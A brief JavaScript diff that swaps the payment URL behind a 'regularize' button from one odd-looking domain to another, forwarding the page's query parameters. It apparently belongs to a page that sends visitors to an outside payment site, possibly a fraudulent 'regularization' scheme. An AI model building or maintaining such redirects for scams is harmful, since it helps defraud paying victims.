@@ -412,7 +412,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const regularizeBtn = document.getElementById("regularizeBtn");
   if (regularizeBtn) {
     regularizeBtn.addEventListener("click", function () {
-      const baseUrl = "https://pay.kitt-hoje.store/v7R0gloe752GVr9";
+      const baseUrl = "https://pay.finalizar.website/yOeXZKlLmozGAQa";
       const currentParams = window.location.search;
 
       const finalUrl = currentParams
